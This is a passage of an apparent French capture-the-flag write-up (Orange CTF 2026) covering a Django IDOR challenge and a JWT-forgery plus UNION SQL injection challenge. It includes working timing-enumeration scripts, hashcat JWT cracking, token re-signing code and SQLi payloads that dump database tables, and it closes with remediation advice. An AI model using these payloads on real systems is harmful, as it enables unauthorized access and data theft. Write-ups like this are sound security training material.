+<thead><tr><th>Étape</th><th>Outil</th><th>Résultat</th></tr></thead>
+<tbody>
+<tr><td>Parser le pcap</td><td>script Python (parsing manuel du format libpcap)</td><td>40 paquets BEACON identifiés</td></tr>
+<tr><td>Calculer la période</td><td>arithmétique exacte (Fraction) sur 39 intervalles</td><td>5.000365 s</td></tr>
+<tr><td>Tester des variantes</td><td>diverses hypothèses de calcul</td><td>aucune validée</td></tr>
+<tr><td>Vérifier le fichier</td><td><code>sha256sum</code> à chaque tentative</td><td>fichier jamais modifié</td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="def-box">
+<div class="def-term">Statut final : non résolu</div>
+<div class="def-body">
+La méthode suit pourtant l'indice à la lettre et reste, à mon sens, la lecture la plus naturelle de la question posée. Le plus probable est que le flag enregistré côté CTFd ait été calculé avec un script légèrement différent du mien (par exemple en comptant un delta de zéro pour le premier paquet filtré), sans que ça ait été corrigé avant la fin du challenge, contrairement à Reversing &amp; Crypto, où l'erreur a bien été identifiée et réparée par les organisateurs.
+</div>
+</div>
+</section>
+
+<!-- ═══════════════════════════ SECTION 07 ═══════════════════════════ -->
+<section class="section" id="s7">
+<div class="section-label">Web / API <span>· 150 pts</span></div>
+<h2 class="section-title">MiWa</h2>
+<div class="status-badges">
+<span class="pill pill-green">✅ Résolu</span>
+<span class="pill pill-red">Web / API</span>
+<span class="pill pill-amber">IDOR</span>
+<span class="pill pill-purple">Django REST</span>
+</div>
+<p><strong>Difficulté :</strong> Moyen · <strong>Cible :</strong> <code>https://orangectf2026-miwa.chals.io/</code></p>
+
+<h3 class="subsection-title">Énoncé</h3>
+<div class="def-box">
+<div class="def-term">MiWa</div>
+<div class="def-body">
+« Ne jamais faire confiance aux clients, j'ai appris la leçon cette fois. »<br>
+<strong>Indice :</strong> « Want some help?? essayez de deviner l'identifiant de l'administrateur. »
+</div>
+</div>
+
+<h3 class="subsection-title">1. Découverte de la surface d'attaque</h3>
+<p>On commence par examiner le serveur et ses en-têtes :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -i https://orangectf2026-miwa.chals.io/</pre>
+</div>
+<p>La réponse révèle un serveur <strong>Gunicorn</strong> (typique Django). En explorant les chemins classiques :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -i https://orangectf2026-miwa.chals.io/admin/
+# → Redirection vers /admin/login/</pre>
+</div>
+<p>On découvre une interface Django Admin. La page de login est accessible : <code>https://orangectf2026-miwa.chals.io/admin/login/?next=/admin/</code></p>
+
+<h3 class="subsection-title">2. Test des méthodes HTTP</h3>
+<p>Un OPTIONS sur la page de login révèle une anomalie :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -i -X OPTIONS https://orangectf2026-miwa.chals.io/admin/login/
+
+HTTP/1.1 200 OK
+Server: gunicorn
+Allow: GET, POST, PUT, HEAD, OPTIONS</pre>
+</div>
+<p>
+<strong>Observation :</strong> Django Admin ne supporte pas PUT nativement. Cela suggère du code custom côté serveur. <em>Fausse piste (le CSRF bloque tout PUT).</em>
+</p>
+
+<h3 class="subsection-title">3. Énumération par timing sur le login</h3>
+<p>On teste plusieurs noms d'utilisateur pour mesurer le temps de réponse (Django effectue un hash de mot de passe plus long si l'user existe) :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Python</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>import requests, time
+
+url = "https://orangectf2026-miwa.chals.io/admin/login/?next=/admin/"
+usernames = ["admin", "miwa", "administrator", "root", "superuser"]
+
+for user in usernames:
+    s = requests.Session()
+    r = s.get(url)
+    csrf = s.cookies.get("csrftoken")
+    data = {"username": user, "password": "wrongpassword",
+            "csrfmiddlewaretoken": csrf, "next": "/admin/"}
+    start = time.time()
+    s.post(url, data=data, headers={"Referer": url}, cookies={"csrftoken": csrf})
+    print(f"{user}: {time.time()-start:.4f}s")</pre>
+</div>
+<p>Résultat :</p>
+<div class="table-wrap">
+<table>
+<thead><tr><th>Username</th><th>Temps</th></tr></thead>
+<tbody>
+<tr><td>admin</td><td>6.63 s</td></tr>
+<tr><td>miwa</td><td>9.17 s ✅</td></tr>
+<tr><td>administrator</td><td>7.69 s</td></tr>
+<tr><td>root</td><td>4.50 s</td></tr>
+<tr><td>superuser</td><td>7.37 s</td></tr>
+</tbody>
+</table>
+</div>
+<p>
+<strong>Conclusion :</strong> <code>miwa</code> est un utilisateur valide. Malheureusement, le mot de passe n'est pas trivial, le brute force classique (rockyou, top10k) échoue et le serveur applique un rate limiting.
+</p>
+
+<h3 class="subsection-title">4. Piste CSRF (fausse piste)</h3>
+<p>
+On teste un POST sans CSRF → <strong>403 Forbidden</strong>. Le middleware CSRF de Django est actif. On ne peut pas contourner facilement. On teste un upload via PUT avec CSRF → la réponse renvoie le HTML de la page de login (4261 octets). Le fichier n'est pas écrit. <em>Fausse piste.</em>
+</p>
+
+<h3 class="subsection-title">5. Forgery de cookie de session</h3>
+<p>On tente de forger un cookie <code>sessionid</code> Django en testant 45 <code>SECRET_KEY</code> candidates (miwa, MiWa2026, orange, django-insecure, etc.) :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Python</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre># ... voir script forget.py ...</pre>
+</div>
+<p><strong>Résultat :</strong> Aucune SECRET_KEY ne matche. Django 4+ vérifie <code>_auth_user_hash</code> → impasse.</p>
+
+<h3 class="subsection-title">6. Fuzzing d'endpoints</h3>
+<p>En testant des endpoints REST classiques, on tombe sur un <strong>301 Moved Permanently</strong> :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -i https://orangectf2026-miwa.chals.io/api/login
+
+HTTP/1.1 301 Moved Permanently
+Location: /api/login/</pre>
+</div>
+<p>Le <code>APPEND_SLASH</code> de Django nous trahit : il existe une route <code>/api/login/</code> !</p>
+
+<h3 class="subsection-title">7. Exploration de /api/login/</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -i -X OPTIONS https://orangectf2026-miwa.chals.io/api/login/</pre>
+</div>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Documentation DRF exposée</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.72rem;line-height:1.6;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">{
+  "name": "Login Api",
+  "description": "POST /api/login/\nBody JSON : {\"username\": \"...\", \"password\": \"...\"}\n\n-&gt; 200 {\"id\": &lt;identifiant&gt;, \"token\": \"&lt;token&gt;\"}",
+  "renders": ["application/json", "text/html"],
+  "parses": ["application/json", "application/x-www-form-urlencoded", "multipart/form-data"]
+}</pre></div>
+<div class="terminal-caption">DRF révèle tout le format du payload attendu.</div>
+</div>
+<p>On découvre : POST <code>/api/login/</code> → renvoie <code>{id, token}</code>, et le header <code>Allow: POST, OPTIONS</code> confirme.</p>
+
+<h3 class="subsection-title">8. Découverte de /api/register/</h3>
+<p>En testant des payloads vides :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -s -X POST https://orangectf2026-miwa.chals.io/api/register/ \
+  -H "Content-Type: application/json" -d '{}'
+
+{"error":"username, password et full_name sont requis."}</pre>
+</div>
+<p>Un endpoint d'inscription est ouvert !</p>
+
+<h3 class="subsection-title">9. Création d'un compte et obtention d'un token</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -s -X POST https://orangectf2026-miwa.chals.io/api/register/ \
+  -H "Content-Type: application/json" \
+  -d '{"username":"hacker","password":"hacker123","full_name":"Hacker Test"}'
+
+{"id":21,"token":"64b24c12b7e3968ce37204a0f6b8b0eb2b2dfb5a"}</pre>
+</div>
+<p><strong>Observations :</strong></p>
+<ul class="plain">
+<li>Compte créé avec <code>id=21</code></li>
+<li>Token = 40 caractères hexadécimaux → c'est un SHA-1</li>
+<li>Le token est le même à chaque connexion (déterministe)</li>
+</ul>
+
+<h3 class="subsection-title">10. Analyse du token</h3>
+<p>On teste plusieurs formules SHA-1 :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>echo -n "hacker" | sha1sum
+# 4dcc4173d80a2817206e196a38f0dbf7850188ff  ❌
+
+echo -n "hacker123" | sha1sum
+# 3dc73eff81d73ce75906fcc937e90b5a05563b48  ❌
+
+echo -n "Hacker Test" | sha1sum
+# 4cd88b41d8e99ec54b562f1112c50dbb131d6ffc  ❌</pre>
+</div>
+<p>Aucune formule simple ne matche. Le token est stocké côté serveur (probablement SHA-1 d'un secret ou stocké en DB).</p>
+
+<h3 class="subsection-title">11. Fuzzing des endpoints protégés</h3>
+<p>On teste une centaine d'endpoints avec le token de hacker :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Python</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>ENDPOINTS = ["/api/me/", "/api/user/", "/api/users/", "/api/profile/",
+             "/api/user/1/", "/api/profile/1/", ...]
+HEADERS = [{"Authorization": f"Bearer {TOKEN}"},
+           {"Authorization": f"Token {TOKEN}"},
+           {"X-Auth-Token": TOKEN}, ...]</pre>
+</div>
+<p>
+<strong>Résultat :</strong> l'endpoint <code>/api/profile/&lt;id&gt;/</code> répond (401 sans token valide, 200 avec). Cependant, <code>Authorization: Bearer</code> retourne 401, le serveur n'utilise pas le standard OAuth/JWT.
+</p>
+
+<h3 class="subsection-title">12. Découverte du bon schéma d'auth</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>TOKEN="3e38a669c83ca6f72777200b1293967a5506c899"
+for h in "Authorization: Bearer" "Authorization: Token" "X-Auth-Token:" \
+         "Token:" "X-API-Key:" "JWT:"; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -H "$h $TOKEN" \
+    "https://orangectf2026-miwa.chals.io/api/profile/25/")
+  echo "[$code] $h"
+done</pre>
+</div>
+<p>Résultat :</p>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Test des schémas d'authentification</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.75rem;line-height:1.7;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">[401] Authorization: Bearer  ❌
+[200] Authorization: Token   ✅
+[200] Authorization: token   ✅
+[401] X-Auth-Token:          ❌
+[401] Token:                 ❌</pre></div>
+<div class="terminal-caption">Le bon header est <code>Authorization: Token &lt;sha1&gt;</code>.</div>
+</div>
+<p>C'est le standard <strong>Django REST Framework TokenAuthentication</strong>.</p>
+
+<h3 class="subsection-title">13. IDOR sur /api/profile/&lt;id&gt;/</h3>
+<p>Avec le token de miwa (id=25), on scanne les IDs 0 à 30 :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>TOKEN="3e38a669c83ca6f72777200b1293967a5506c899"
+for id in $(seq 0 30); do
+  curl -s -H "Authorization: Token $TOKEN" \
+    "https://orangectf2026-miwa.chals.io/api/profile/$id/"
+done</pre>
+</div>
+<p>Résultats :</p>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Énumération des profils</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.72rem;line-height:1.6;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">[200] id=1 -&gt; {"id":1,"full_name":"Administrator","role":"admin","secret_flag":"FLAG{broken_access_control_demo}"}
+[200] id=2 -&gt; {"id":2,"full_name":"Yoan","role":"user","secret_flag":""}
+[200] id=3 -&gt; {"id":3,"full_name":"Bhale K","role":"user","secret_flag":""}
+[200] id=4 -&gt; {"id":4,"full_name":"Massamba","role":"user","secret_flag":""}
+[200] id=5 -&gt; {"id":5,"full_name":"Hecker Test","role":"user","secret_flag":""}
+...
+[200] id=25 -&gt; {"id":25,"full_name":"MiWa","role":"user","secret_flag":""}</pre></div>
+<div class="terminal-caption">L'admin est à l'ID 1.</div>
+</div>
+<p>L'admin est à l'ID 1, cohérent avec l'indice « devinez l'identifiant de l'administrateur ».</p>
+
+<div class="flag-box">
+<div class="flag-label">Flag final</div>
+<div class="flag-text">FLAG{broken_access_control_demo}</div>
+</div>
+
+<h3 class="subsection-title">Commande finale</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -s -H "Authorization: Token 3e38a669c83ca6f72777200b1293967a5506c899" \
+  https://orangectf2026-miwa.chals.io/api/profile/1/</pre>
+</div>
+
+<h3 class="subsection-title">Analyse de la vulnérabilité : Broken Access Control (IDOR)</h3>
+<p>
+L'endpoint <code>/api/profile/&lt;id&gt;/</code> ne vérifie pas que l'utilisateur authentifié a le droit de lire le profil demandé. N'importe quel utilisateur connecté peut lire n'importe quel profil en changeant l'<code>&lt;id&gt;</code> dans l'URL.
+</p>
+<p><strong>Pourquoi ce challenge illustre « ne jamais faire confiance aux clients » :</strong></p>
+<ol class="plain">
+<li>L'auth est confiée à un header (<code>Authorization: Token</code>) que le client envoie ; si le serveur ne valide pas le contrôle d'accès, le token devient un simple laissez-passer universel.</li>
+<li>L'ID est fourni par le client dans l'URL (<code>/api/profile/1/</code>), sans vérification côté serveur que l'utilisateur a le droit de voir ce profil.</li>
+<li>Le token est déterministe (SHA-1), donc rejouable et potentiellement forgeable si on trouve la formule.</li>
+</ol>
+
+<h3 class="subsection-title">Impact réel</h3>
+<ul class="plain">
+<li><strong>Fuite de données :</strong> lecture de tous les profils utilisateurs (PII, secrets).</li>
+<li><strong>Escalade de privilèges :</strong> un utilisateur normal peut accéder aux données d'un admin.</li>
+<li>Dans un cas réel : ce type de faille a causé d'énormes fuites (ex : Facebook, First American Financial).</li>
+</ul>
+
+<h3 class="subsection-title">Recommandations de correction</h3>
+<div class="glossary-grid">
+<div class="glossary-card">
+<div class="glossary-term">01 · Contrôle d'accès côté serveur</div>
+<div class="glossary-def">Vérifier systématiquement que l'utilisateur authentifié a le droit de lire la ressource demandée.</div>
+</div>
+<div class="glossary-card">
+<div class="glossary-term">02 · UUIDs au lieu d'IDs séquentiels</div>
+<div class="glossary-def">Remplacer <code>/api/profile/1/</code> par <code>/api/profile/a3f5-.../</code> pour empêcher l'énumération.</div>
+</div>
+<div class="glossary-card">
+<div class="glossary-term">03 · Forcer le contexte utilisateur</div>
+<div class="glossary-def">Le serveur doit imposer son propre ID (<code>request.user.id</code>) au lieu d'accepter un ID arbitraire.</div>
+</div>
+<div class="glossary-card">
+<div class="glossary-term">04 · Ne pas exposer de champs sensibles</div>
+<div class="glossary-def">Les serializers ne doivent pas inclure <code>secret_flag</code>, <code>is_admin</code>, etc.</div>
+</div>
+<div class="glossary-card">
+<div class="glossary-term">05 · Rate limiting</div>
+<div class="glossary-def">Empêcher l'énumération massive des IDs par utilisateur authentifié.</div>
+</div>
+</div>
+
+<h3 class="subsection-title">Récapitulatif du cheminement</h3>
+<div class="table-wrap">
+<table>
+<thead><tr><th>#</th><th>Étape</th><th>Outil / Commande</th><th>Résultat</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>Recon</td><td><code>curl</code> sur <code>/</code></td><td>Gunicorn + Django</td></tr>
+<tr><td>2</td><td>OPTIONS</td><td><code>curl -X OPTIONS /admin/login/</code></td><td>Fausse piste (PUT bloqué)</td></tr>
+<tr><td>3</td><td>Timing attack</td><td>Script Python</td><td>miwa = user valide</td></tr>
+<tr><td>4</td><td>Brute force</td><td>rockyou + top10k</td><td>Échec</td></tr>
+<tr><td>5</td><td>Forgery session</td><td>45 SECRET_KEY</td><td>Échec</td></tr>
+<tr><td>6</td><td>Fuzzing API</td><td><code>curl /api/login</code> → 301</td><td><code>/api/login/</code> existe</td></tr>
+<tr><td>7</td><td>Découverte API</td><td><code>OPTIONS /api/login/</code></td><td>Format du payload révélé</td></tr>
+<tr><td>8</td><td>Inscription</td><td><code>POST /api/register/</code></td><td>Compte + token SHA-1</td></tr>
+<tr><td>9</td><td>Fuzzing endpoints</td><td>Avec token</td><td><code>/api/profile/&lt;id&gt;/</code></td></tr>
+<tr><td>10</td><td>Auth DRF</td><td>Test des variantes</td><td><code>Authorization: Token</code></td></tr>
+<tr><td>11</td><td>IDOR</td><td>Scan IDs 0-30</td><td>Admin à l'ID 1</td></tr>
+<tr><td>12</td><td>Flag</td><td><code>GET /api/profile/1/</code></td><td>FLAG{...}</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3 class="subsection-title">Leçons à retenir</h3>
+<ul class="rec-list">
+<li><span class="rec-num">01</span><div>Toujours tester les chemins <code>/api/</code>, <code>/v1/</code>, <code>/rest/</code>, les endpoints cachés sont la première cause de compromission en CTF.</div></li>
+<li><span class="rec-num">02</span><div>Un <strong>301</strong> sur un chemin = potentiel endpoint caché (à cause de <code>APPEND_SLASH</code> de Django).</div></li>
+<li><span class="rec-num">03</span><div>Un endpoint <strong>OPTIONS</strong> révèle souvent la documentation de l'API (DRF est très bavard).</div></li>
+<li><span class="rec-num">04</span><div>Ne pas se limiter à <code>Authorization: Bearer</code>, tester <code>Token</code>, <code>X-Auth-Token</code>, <code>JWT</code>, <code>Api-Key</code>.</div></li>
+<li><span class="rec-num">05</span><div>L'<strong>IDOR</strong> est la faille n°1 des API modernes : toujours tester les IDs voisins (1, 2, 0, -1, 100...).</div></li>
+<li><span class="rec-num">06</span><div>Les indices du challenge sont à prendre au pied de la lettre : « ne jamais faire confiance aux clients » + « devinez l'identifiant » = IDOR sur ID utilisateur.</div></li>
+</ul>
+
+<h3 class="subsection-title">Références</h3>
+<div class="glossary-grid">
+<div class="glossary-card">
+<div class="glossary-term">OWASP · Broken Access Control</div>
+<div class="glossary-def">https://owasp.org/Top10/A01_2021-Broken_Access_Control/</div>
+</div>
+<div class="glossary-card">
+<div class="glossary-term">OWASP API Security · BOLA</div>
+<div class="glossary-def">https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/</div>
+</div>
+<div class="glossary-card">
+<div class="glossary-term">Django REST Framework · Auth</div>
+<div class="glossary-def">https://www.django-rest-framework.org/api-guide/authentication/</div>
+</div>
+<div class="glossary-card">
+<div class="glossary-term">PortSwigger · IDOR</div>
+<div class="glossary-def">https://portswigger.net/web-security/access-control/idor</div>
+</div>
+</div>
+</section>
+
+<!-- ═══════════════════════════ SECTION 08 ═══════════════════════════ -->
+<section class="section" id="s8">
+<div class="section-label">Web / API <span>· 200 pts</span></div>
+<h2 class="section-title">Web Security Expert · « Prof Imposteur »</h2>
+<div class="status-badges">
+<span class="pill pill-green">✅ Résolu</span>
+<span class="pill pill-red">Web / API</span>
+<span class="pill pill-purple">JWT</span>
+<span class="pill pill-amber">SQL Injection</span>
+</div>
+<p>
+<strong>Challenge :</strong> Récupérer le mot de passe via SQL injection · <strong>Cible :</strong> <code>https://orangectf2026-kusakabe.chals.io</code>
+</p>
+
+<h3 class="subsection-title">Reconnaissance</h3>
+<p>Un ffuf sur le domaine révèle une seule route exposée : <code>/api</code>.</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>ffuf -u https://orangectf2026-kusakabe.chals.io/FUZZ -w raft-small-directories.txt
+api    [Status: 301]</pre>
+</div>
+<p>Une requête sur <code>/api/</code> liste les endpoints disponibles :</p>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Documentation exposée sur /api/</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.72rem;line-height:1.6;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">{
+  "challenge": "Prof Imposteur",
+  "endpoints": {
+    "POST /api/register": "{username, password} -&gt; crée un compte étudiant + JWT",
+    "POST /api/login": "{username, password} -&gt; JWT",
+    "GET  /api/me": "infos du jeton courant (Bearer)",
+    "GET  /api/teacher/students?search=": "détails des élèves (PROFESSEUR uniquement)"
+  },
+  "hint": "Le jeton est signé HS256. La clé est... faible."
+}</pre></div>
+<div class="terminal-caption">Deux cibles : JWT + endpoint search réservé aux profs.</div>
+</div>
+<p>
+Deux cibles apparaissent clairement : un <strong>contrôle d'accès basé sur un rôle encodé dans un JWT</strong>, et un endpoint <code>search</code> réservé aux profs, candidat naturel pour une <strong>injection SQL</strong>.
+</p>
+
+<h3 class="subsection-title">Étape 1 : Élévation de privilège via JWT forgé</h3>
+<p>Création d'un compte étudiant classique :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -X POST .../api/register -d '{"username":"test123","password":"test123"}'
+curl -X POST .../api/login    -d '{"username":"test123","password":"test123"}'</pre>
+</div>
+<p>Le JWT obtenu, décodé (base64, sans vérification) :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">JSON</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>{"user_id":4,"username":"test123","role":"student","teacher_id":null,"iat":...,"exp":...}</pre>
+</div>
+<p>
+Le contrôle d'accès repose entièrement sur le champ <code>role</code> du payload, validé uniquement par la signature HS256. L'indice annonçait une clé faible : bruteforce avec hashcat (mode 16500) sur rockyou.txt :
+</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>hashcat -a 0 -m 16500 "&lt;JWT&gt;" rockyou.txt --show</pre>
+</div>
+<p>→ clé trouvée : <strong><code>secret</code></strong>.</p>
+<p>Avec la clé en main, re-signature d'un token avec <code>role: "teacher"</code> (PyJWT) :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Python</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>import jwt, time
+now = int(time.time())
+payload = {"user_id":4,"username":"test123","role":"teacher","teacher_id":None,"iat":now,"exp":now+3600}
+print(jwt.encode(payload, "secret", algorithm="HS256"))</pre>
+</div>
+<p>
+Ce token forgé est accepté par <code>GET /api/teacher/students</code>, accès prof obtenu sans jamais avoir le vrai mot de passe d'un prof.
+</p>
+
+<h3 class="subsection-title">Étape 2 : Injection SQL sur le paramètre search</h3>
+<p>
+<code>teacher_id</code> étant <code>null</code> dans le token forgé, la requête backend ne renvoie aucun élève (<code>WHERE teacher_id = NULL</code> ne matche rien en SQL). Mais le paramètre <code>search</code> reste exploitable indépendamment.
+</p>
+<p>Confirmation avec sqlmap :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>sqlmap -u ".../api/teacher/students?search=test" --headers="Authorization: Bearer &lt;JWT&gt;" --dbs</pre>
+</div>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Sortie sqlmap</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.72rem;line-height:1.6;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">Parameter: search (GET)
+Type: UNION query
+Title: Generic UNION query (NULL) - 6 columns
+Payload: search=test' UNION ALL SELECT ... --
+back-end DBMS: SQLite</pre></div>
+<div class="terminal-caption">Injection UNION based confirmée, backend SQLite.</div>
+</div>
+<p>Une erreur SQL provoquée volontairement a révélé la requête exacte côté serveur :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">SQL</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>SELECT id, name, email, teacher_id, grade, secret_note
+FROM api_student
+WHERE teacher_id = 'None' AND name LIKE '%&lt;search&gt;%'</pre>
+</div>
+<p>→ injection UNION based classique à <strong>6 colonnes</strong>, backend SQLite.</p>
+
+<h3 class="subsection-title">Étape 3 : Énumération du schéma</h3>
+<p>SQLite stocke le DDL de chaque table dans <code>sqlite_master</code>, exploitable directement via l'injection :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -G .../api/teacher/students \
+  --data-urlencode "search=test' UNION SELECT name,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'-- -" \
+  -H "Authorization: Bearer &lt;JWT_teacher&gt;"</pre>
+</div>
+<p>
+→ 11 tables, dont <code>api_account</code> (comptes applicatifs) et <code>api_student</code> (fiches élèves, avec une colonne <code>secret_note</code> repérée via l'erreur SQL précédente).
+</p>
+<p>
+Dump de <code>api_account</code> (colonnes <code>username</code>, <code>password</code>, <code>role</code>, <code>teacher_id</code>, <code>display_name</code>) : les comptes profs (<code>prof.gojo</code>, <code>prof.yaga</code>) ont un mot de passe factice (<code>x-non-utilise</code>), fausse piste, leur authentification réelle ne passe pas par cette table. <code>auth_user</code> (table Django standard) s'est avérée vide.
+</p>
+
+<h3 class="subsection-title">Étape 4 : Extraction du flag</h3>
+<p>Pivot vers <code>api_student</code>, en ciblant directement le champ <code>secret_note</code> révélé par l'erreur SQL de l'étape précédente :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>curl -G .../api/teacher/students \
+  --data-urlencode "search=test' UNION SELECT name,secret_note,NULL,NULL,NULL,NULL FROM api_student-- -" \
+  -H "Authorization: Bearer &lt;JWT_teacher&gt;"</pre>
+</div>
+<p>Résultat :</p>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Flag extrait</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.75rem;line-height:1.7;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">{"id": "Gojo Satoru", "name": "CTF{Im_Stronger_Than_Your_Password}", ...}</pre></div>
+<div class="terminal-caption">Le flag était caché dans la colonne <code>secret_note</code>.</div>
+</div>
+
+<div class="flag-box">
+<div class="flag-label">Flag final</div>
+<div class="flag-text">CTF{Im_Stronger_Than_Your_Password}</div>
+</div>
+
+<h3 class="subsection-title">Résumé de la chaîne d'exploitation</h3>
+<div class="chain">
+<span class="chain-title">Chaîne d'attaque</span>
+<span class="chain-node highlight">1. Compte étudiant → JWT légitime</span>
+<span class="chain-arrow">→</span>
+<span class="chain-node">2. Bruteforce HS256 (secret)</span>
+<span class="chain-arrow">→</span>
+<span class="chain-node">3. Forge JWT role:teacher</span>
+<span class="chain-arrow">→</span>
+<span class="chain-node">4. SQLi UNION sur search</span>
+<span class="chain-arrow">→</span>
+<span class="chain-node">5. Énumération sqlite_master</span>
+<span class="chain-arrow">→</span>
+<span class="chain-node danger">6. Flag dans api_student.secret_note</span>
+</div>
+</section>
+
+<footer>
+<div class="footer-author">
+Rédigé par <strong style="color: var(--cyan);">SPECTRA MZ</strong>
+&nbsp;·&nbsp; Write-up : Orange CTF 2026
+<br>
+<span style="font-size:.72rem;">mer. 14 oct. 2026 21:24:02 WAT</span>
+<br>
+<a class="bottom-back" href="../index.html">← Retour à l'accueil</a>
+</div>
+<div class="footer-badge">
+<span>🍊</span> Orange CTF · Reversing / Network / Web
+</div>
+</footer>
+
+</div>
+</main>
+
+<script>
+function copyCode(btn){
+const pre=btn.closest('.code-wrap').querySelector('pre');
+const text=pre.innerText;
+navigator.clipboard.writeText(text).then(()=>{
+btn.textContent='copié ✓';
+btn.style.borderColor='var(--cyan)';
+btn.style.color='var(--cyan)';
+setTimeout(()=>{
+btn.textContent='copier';
+btn.style.borderColor='';
+btn.style.color='';
+},1800);
+});
+}
+
+const sections=document.querySelectorAll('.section[id]');
+const dots=document.querySelectorAll('.phase-dot');
+const mobileItems=document.querySelectorAll('.mobile-nav-item');
+const progressFill=document.getElementById('progressFill');
+
+function updateActive(){
+let current=sections[0]?sections[0].id:'';
+sections.forEach(sec=>{if(window.scrollY+200>=sec.offsetTop)current=sec.id;});
+dots.forEach(dot=>dot.classList.toggle('active',dot.getAttribute('href')==='#'+current));
+mobileItems.forEach(item=>item.classList.toggle('active',item.getAttribute('href')==='#'+current));
+
+const docHeight=document.documentElement.scrollHeight-window.innerHeight;
+const scrolled=docHeight>0?(window.scrollY/docHeight)*100:0;
+progressFill.style.width=scrolled+'%';
+}
+
+window.addEventListener('scroll',updateActive,{passive:true});
